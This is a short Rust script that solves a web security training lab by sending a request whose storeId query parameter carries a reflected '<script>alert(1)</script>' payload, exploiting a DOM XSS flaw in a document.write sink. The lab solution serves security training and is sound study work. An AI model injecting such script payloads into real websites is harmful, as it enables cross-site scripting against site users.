/*******************************************************************
*
* Lab: DOM XSS in document.write sink using source location.search 
*      inside a select element
*
* Hack Steps: 
*      1. Inject payload in the storeId query parameter
*      2. Observe that the alert function has been called
*
********************************************************************/
use reqwest::{
    blocking::{Client, ClientBuilder},
    redirect::Policy,
};
use std::{
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0aa4003d03ed15d481ae7ff000d7003d.web-security-academy.net";

fn main() {
    let payload = "<script>alert(1)</script>";

    print!("❯❯ Injecting payload in the storeId query parameter.. ");
    io::stdout().flush().unwrap();

    let client = build_web_client();
    client
        .get(format!("{LAB_URL}/product?productId=1&storeId={payload}"))
        .send()
        .expect(&format!(
            "{}",
            "⦗!⦘ Failed to fetch the page with the injected payload".red()
        ));

    println!("{}", "OK".green());
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}
